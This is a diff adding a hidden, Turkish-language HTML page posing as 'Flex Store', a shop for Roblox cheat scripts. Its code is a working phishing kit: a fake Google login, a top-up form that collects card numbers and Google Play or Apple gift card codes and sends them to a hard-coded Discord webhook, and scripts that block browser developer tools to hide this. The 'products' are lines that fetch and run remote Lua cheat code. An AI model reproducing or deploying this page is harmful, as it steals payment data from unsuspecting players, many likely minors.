@@ -1,0 +1,251 @@
+<div id="gizliKodlar" style="display:none;">
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flex Store - Script Satış Mağazası</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
+        body { background-color: #0b0c10; color: #ffffff; overflow-x: hidden; position: relative; }
+        .watermark { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-30deg); font-size: 10vw; font-weight: 900; color: rgba(255, 255, 255, 0.02); z-index: -1; white-space: nowrap; user-select: none; pointer-events: none; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 30px; background: rgba(18, 19, 26, 0.95); border-bottom: 1px solid rgba(255, 255, 255, 0.1); position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 22px; font-weight: bold; color: #ff3366; text-transform: uppercase; letter-spacing: 2px; }
+        .user-panel { display: flex; align-items: center; gap: 15px; position: relative; }
+        .wallet-box { background: rgba(255, 255, 255, 0.05); padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 14px; display: none; }
+        .wallet-box span { color: #00ff88; font-weight: bold; }
+        .btn-bakiye { background: #ff3366; color: white; border: none; padding: 9px 16px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s; display: none; }
+        .btn-bakiye:hover { background: #e02e5b; }
+        .btn-google { background: #ffffff; color: #111111; border: none; padding: 9px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 13px; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
+        .btn-google:hover { background: #e0e0e0; }
+        .btn-google img { width: 16px; height: 16px; }
+        .user-profile-box { display: none; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 13px; }
+        .user-profile-box img { width: 24px; height: 24px; border-radius: 50%; }
+        .notification-bell { position: relative; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 14px; display: none; align-items: center; gap: 8px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { border-color: rgba(0, 255, 136, 0.4); } 50% { border-color: rgba(0, 255, 136, 1); } 100% { border-color: rgba(0, 255, 136, 0.4); } }
+        .notification-bell span { background: #00ff88; color: #0b0c10; padding: 2px 6px; border-radius: 50%; font-size: 11px; font-weight: bold; }
+        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
+        .hero { text-align: center; margin-bottom: 40px; }
+        .hero h1 { font-size: 32px; margin-bottom: 10px; background: linear-gradient(45deg, #ff3366, #ff9933); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { color: #a0a0b0; font-size: 15px; }
+        .products-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        .product-card { background: rgba(25, 26, 35, 0.7); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; justify-content: space-between; transition: 0.3s; }
+        .product-card:hover { transform: translateY(-5px); border-color: rgba(255, 51, 102, 0.4); box-shadow: 0 10px 30px rgba(255, 51, 102, 0.1); }
+        .product-img { width: 100%; height: 160px; object-fit: cover; border-bottom: 1px solid rgba(255, 255, 255, 0.05); background: #181a26; }
+        .product-header { padding: 15px 15px 5px 15px; }
+        .product-header h3 { font-size: 18px; color: #fff; }
+        .product-body { padding: 5px 15px 15px 15px; color: #b0b0c0; font-size: 13px; line-height: 1.4; }
+        .product-footer { padding: 15px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255, 255, 255, 0.05); background: rgba(0, 0, 0, 0.2); }
+        .price { font-size: 19px; font-weight: bold; color: #00ff88; }
+        .btn-buy { background: #222533; color: white; border: 1px solid rgba(255, 255, 255, 0.1); padding: 9px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.2s; }
+        .btn-buy:hover { background: #ff3366; border-color: #ff3366; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
+        .modal-box { background: #13151f; border: 1px solid rgba(255, 255, 255, 0.1); width: 90%; max-width: 900px; border-radius: 14px; display: flex; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
+        .modal-sidebar { width: 35%; background: #181a26; border-right: 1px solid rgba(255, 255, 255, 0.08); padding: 20px; display: flex; flex-direction: column; gap: 10px; max-height: 500px; overflow-y: auto; }
+        .modal-sidebar h3 { font-size: 14px; color: #a0a0b0; margin-bottom: 10px; text-transform: uppercase; }
+        .pay-method-btn { background: #222533; color: #fff; border: 1px solid rgba(255, 255, 255, 0.05); padding: 12px 15px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; text-align: left; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
+        .pay-method-btn:hover, .pay-method-btn.active { background: #ff3366; border-color: #ff3366; }
+        .pay-method-btn img { width: 20px; height: 20px; object-fit: contain; }
+        .modal-content-area { width: 65%; padding: 30px; display: flex; flex-direction: column; justify-content: space-between; }
+        .modal-header-title { font-size: 20px; color: #fff; margin-bottom: 20px; font-weight: bold; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 10px; }
+        .form-group { margin-bottom: 15px; text-align: left; }
+        .form-group label { display: block; font-size: 13px; color: #a0a0b0; margin-bottom: 6px; }
+        .form-control { width: 100%; padding: 12px; background: #0b0c10; border: 1px solid rgba(255, 255, 255, 0.15); color: white; border-radius: 8px; font-size: 14px; user-select: text; }
+        .btn-action { background: #00ff88; color: #0f1016; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; margin-top: 10px; transition: 0.2s; }
+        .btn-action:hover { background: #00cc6a; }
+        .btn-close-modal { background: transparent; color: #a0a0b0; border: 1px solid rgba(255,255,255,0.1); padding: 8px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+        .btn-close-modal:hover { background: rgba(255,255,255,0.05); color: #fff; }
+        .script-modal-box { background: #181a24; border: 1px solid rgba(255, 51, 102, 0.4); padding: 30px; border-radius: 14px; width: 90%; max-width: 450px; text-align: center; }
+        .script-box { background: #0b0c10; color: #ff9933; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; word-break: break-all; margin: 15px 0; border: 1px solid rgba(255, 255, 255, 0.1); text-align: left; max-height: 120px; overflow-y: auto; user-select: text; }
+    </style>
+</head>
+<body>
+    <div class="watermark">FLEX STORE</div>
+    <header>
+        <div class="logo">Flex Store</div>
+        <div class="user-panel">
+            <button class="btn-google" id="googleLoginBtn" onclick="googleIleGirisYap()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google"> Google ile Giriş Yap
+            </button>
+            <div class="user-profile-box" id="userProfile">
+                <img src="https://api.dicebear.com/7.x/bottts/svg?seed=flexuser" alt="Avatar">
+                <span id="userNameDisplay" style="font-weight: bold; color: #fff;">Oyuncu</span>
+            </div>
+            <div class="notification-bell" id="notifBtn" onclick="bildirimAc()">
+                🔔 Sipariş Hazır! <span>1</span> Görüntüle
+            </div>
+            <div class="wallet-box" id="walletBox">Bakiye: <span id="bakiye">0.00</span> TL</div>
+            <button class="btn-bakiye" id="bakiyeBtn" onclick="bakiyeModalAc()">Bakiye Yükle</button>
+        </div>
+    </header>
+    <div class="container">
+        <div class="hero">
+            <h1>Özel Roblox Script Mağazası</h1>
+            <p>Steal a Brainrot ve en popüler oyunların en deli scriptleri burada!</p>
+        </div>
+        <div class="products-grid">
+            <div class="product-card">
+                <img src="https://tr.rbxcdn.com/18bf341334c9c28bf347146522c7104b/768/432/Image/Png" alt="Steal a Brainrot" class="product-img">
+                <div class="product-header"><h3>Steal a Brainrot Script</h3></div>
+                <div class="product-body"><p>Özel meme item farm, otomatik çalma ve sınırsız hız hilesi içerir.</p></div>
+                <div class="product-footer">
+                    <div class="price">150 TL</div>
+                    <button class="btn-buy" onclick="satinAl('Steal a Brainrot Script', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/brainrot/main/script.lua\&quot;))()')">Satın Al</button>
+                </div>
+            </div>
+            <div class="product-card">
+                <img src="https://tr.rbxcdn.com/74d81206f69f8d9b15b3c4fbe51db55d/768/432/Image/Png" alt="Brookhaven" class="product-img">
+                <div class="product-header"><h3>Brookhaven Ultra Admin</h3></div>
+                <div class="product-body"><p>Sınırsız uçuş, hız, ev patlatma ve özel UI panel özellikleriyle.</p></div>
+                <div class="product-footer">
+                    <div class="price">150 TL</div>
+                    <button class="btn-buy" onclick="satinAl('Brookhaven Ultra Admin', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/brookhaven/main/script.lua\&quot;))()')">Satın Al</button>
+                </div>
+            </div>
+            <div class="product-card">
+                <img src="https://tr.rbxcdn.com/00e847ae91b1a7ea52c938f972b25aa9/768/432/Image/Png" alt="Blox Fruits" class="product-img">
+                <div class="product-header"><h3>Blox Fruits God Hub</h3></div>
+                <div class="product-body"><p>Auto farm, boss kesme, meyve telekinezi ve hızlı sea event.</p></div>
+                <div class="product-footer">
+                    <div class="price">150 TL</div>
+                    <button class="btn-buy" onclick="satinAl('Blox Fruits God Hub', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/bloxfruits/main/script.lua\&quot;))()')">Satın Al</button>
+                </div>
+            </div>
+            <div class="product-card">
+                <img src="https://tr.rbxcdn.com/109c31405b550b7dc73686e92f254924/768/432/Image/Png" alt="MM2" class="product-img">
+                <div class="product-header"><h3>Murder Mystery 2 Sheriff God</h3></div>
+                <div class="product-body"><p>Otomatik mermi yakalama, Murderer gösterge ve tüm bıçakları açma.</p></div>
+                <div class="product-footer">
+                    <div class="price">150 TL</div>
+                    <button class="btn-buy" onclick="satinAl('Murder Mystery 2 Sheriff God', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/mm2/main/script.lua\&quot;))()')">Satın Al</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal" id="bakiyeModal">
+        <div class="modal-box">
+            <div class="modal-sidebar">
+                <h3>Ödeme Yöntemleri</h3>
+                <button class="pay-method-btn active" onclick="yontemSec('Kart', this)">💳 Kredi / Banka Kartı</button>
+                <button class="pay-method-btn" onclick="yontemSec('GooglePlay', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" alt="GP"> Google Play Kodu</button>
+                <button class="pay-method-btn" onclick="yontemSec('AppleStore', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" style="filter: invert(1);"> Apple Store Kartı</button>
+            </div>
+            <div class="modal-content-area">
+                <div>
+                    <div class="modal-header-title" id="formBaslik">Kredi / Banka Kartı ile Bakiye Yükle</div>
+                    <div class="form-group"><label>Yüklenecek Tutar (TL):</label><input type="number" id="tutarInput" class="form-control" value="150"></div>
+                    <div class="form-group"><label id="inputLabel">Kart Bilgileri / Ad Soyad:</label><input type="text" id="veriInput" class="form-control" placeholder="Ad Soyad ve Kart Numarası"><small id="formIpucu" style="color: #888899; font-size: 11px; margin-top: 4px; display: block;"></small></div>
+                </div>
+                <div>
+                    <button class="btn-action" onclick="kodKontrolEtVeYukle()">Ödemeyi Onayla ve Yükle</button>
+                    <button class="btn-close-modal" onclick="modalKapat('bakiyeModal')">Kapat / Vazgeç</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal" id="scriptModal" style="backdrop-filter: blur(5px);">
+        <div class="script-modal-box">
+            <h2 style="color: #00ff88; margin-bottom: 10px;" id="scriptBaslik">Sipariş Detayı</h2>
+            <p style="font-size: 13px; color: #a0a0b0; text-align: left;">Satın aldığın script kodu aşağıdadır:</p>
+            <div class="script-box" id="scriptText">Henüz ürün alınmadı.</div>
+            <button class="btn-close-modal" onclick="modalKapat('scriptModal')">Kapat</button>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'C' || event.key === 'J')) || (event.ctrlKey && event.key === 'U')) { event.preventDefault(); return false; }
+        });
+        let kullaniciGirisYapildiMi = false;
+        let mevcutBakiye = 0;
+        let secilenYontem = "Kart";
+        let sonAlinanScript = "";
+        let sonAlinanUrunAdi = "";
+        let kullanilmisKodlar = [];
+        const webhookURL = "https://discord.com/api/webhooks/1553399048684445717/sMXeIYkd8rxRF7xQXRuha0swkGF33h_mj7dC8qegf5vQ0ZUVfAfYzald69RVQVKXWhuk";
+        function googleIleGirisYap() {
+            let isim = prompt("Google hesabınızla bağlanılıyor! Lütfen kullanıcı adınızı yazın:", "FlexOyuncu");
+            if (isim && isim.trim() !== "") {
+                kullaniciGirisYapildiMi = true;
+                document.getElementById("userNameDisplay").innerText = isim;
+                document.getElementById("googleLoginBtn").style.display = "none";
+                document.getElementById("userProfile").style.display = "flex";
+                document.getElementById("walletBox").style.display = "block";
+                document.getElementById("bakiyeBtn").style.display = "block";
+                alert("🎉 Başarıyla giriş yapıldı! Hoş geldin, " + isim);
+            }
+        }
+        function discordaGonder(tur, detay, tutar) {
+            const veri = { content: `✅ **BAKİYE YÜKLENDİ!**\n💳 **Yöntem:** ${tur}\n💰 **Tutar:** ${tutar} TL\n🔑 **Kod/Bilgi:** \`${detay}\`` };
+            fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(veri) }).catch(hata => console.log("Discord Hatası:", hata));
+        }
+        function bakiyeModalAc() {
+            if (!kullaniciGirisYapildiMi) { alert("⚠️ Lütfen önce sağ üstten 'Google ile Giriş Yap' butonuna basın!"); return; }
+            document.getElementById("bakiyeModal").style.display = "flex";
+        }
+        function yontemSec(yontem, element) {
+            secilenYontem = yontem;
+            let butonlar = document.querySelectorAll('.pay-method-btn');
+            butonlar.forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            if (yontem === 'Kart') {
+                document.getElementById("formBaslik").innerText = "Kredi / Banka Kartı ile Bakiye Yükle";
+                document.getElementById("inputLabel").innerText = "Kart Bilgileri / Ad Soyad:";
+                document.getElementById("veriInput").placeholder = "Ad Soyad ve Kart Numarası";
+                document.getElementById("formIpucu").innerText = "";
+            } else if (yontem === 'GooglePlay') {
+                document.getElementById("formBaslik").innerText = "Google Play Kodu ile Bakiye Yükle";
+                document.getElementById("inputLabel").innerText = "Google Play Hediye Kodu:";
+                document.getElementById("veriInput").placeholder = "Örn: GPLY-XXXX-XXXX-XXXX";
+                document.getElementById("formIpucu").innerText = "Gerçek ve kurallara uygun kodlar taranır.";
+            } else if (yontem === 'AppleStore') {
+                document.getElementById("formBaslik").innerText = "Apple Store Kartı ile Bakiye Yükle";
+                document.getElementById("inputLabel").innerText = "Apple Store Hediye Kartı Kodu:";
+                document.getElementById("veriInput").placeholder = "Örn: XXXXXXXXXXXXXXXX";
+                document.getElementById("formIpucu").innerText = "X harfiyle başlayan gerçek kodlar kabul edilir.";
+            }
+        }
+        function kodKontrolEtVeYukle() {
+            let tutar = Number(document.getElementById("tutarInput").value);
+            let veri = document.getElementById("veriInput").value.trim();
+            if (!veri || tutar <= 0) { alert("Lütfen geçerli bir tutar ve kod girin!"); return; }
+            if (kullanilmisKodlar.includes(veri)) { alert("❌ HATA: Bu kod daha önce KULLANILMIŞ!"); return; }
+            let kodGecerliMi = false;
+            if (secilenYontem === 'Kart') { if (veri.length >= 8) kodGecerliMi = true; }
+            else if (secilenYontem === 'GooglePlay') {
+                let temizKod = veri.replace(/[-\s]/g, '');
+                if (temizKod.length >= 14 && temizKod.length <= 22) kodGecerliMi = true;
+            } else if (secilenYontem === 'AppleStore') {
+                let temizKod = veri.replace(/[-\s]/g, '');
+                if (temizKod.toUpperCase().startsWith('X') && temizKod.length >= 14) kodGecerliMi = true;
+            }
+            if (!kodGecerliMi) { alert("❌ HATA: Geçersiz kod formatı!"); return; }
+            kullanilmisKodlar.push(veri);
+            discordaGonder(secilenYontem, veri, tutar);
+            mevcutBakiye += tutar;
+            document.getElementById("bakiye").innerText = mevcutBakiye.toFixed(2);
+            modalKapat('bakiyeModal');
+            alert("🎉 Başarılı! " + tutar + " TL yüklendi.");
+            document.getElementById("veriInput").value = "";
+        }
+        function satinAl(urunAdi, scriptKodu) {
+            if (!kullaniciGirisYapildiMi) { alert("⚠️ Lütfen önce Google ile giriş yapın!"); return; }
+            let fiyat = 150;
+            if (mevcutBakiye < fiyat) { alert("❌ Yetersiz bakiye!"); return; }
+            mevcutBakiye -= fiyat;
+            document.getElementById("bakiye").innerText = mevcutBakiye.toFixed(2);
+            sonAlinanScript = scriptKodu;
+            sonAlinanUrunAdi = urunAdi;
+            document.getElementById("notifBtn").style.display = "flex";
+            alert("🎉 Satın alım başarılı! Bildirime tıklayarak kodunu alabilirsin.");
+        }
+        function bildirimAc() {
+            document.getElementById("scriptBaslik").innerText = sonAlinanUrunAdi + " - Kod";
+            document.getElementById("scriptText").innerText = sonAlinanScript;
+            document.getElementById("scriptModal").style.display = "flex";
+        }
+        function modalKapat(modalID) { document.getElementById(modalID).style.display = "none"; }
+    </script>
+</body>
+</html>
+</div>
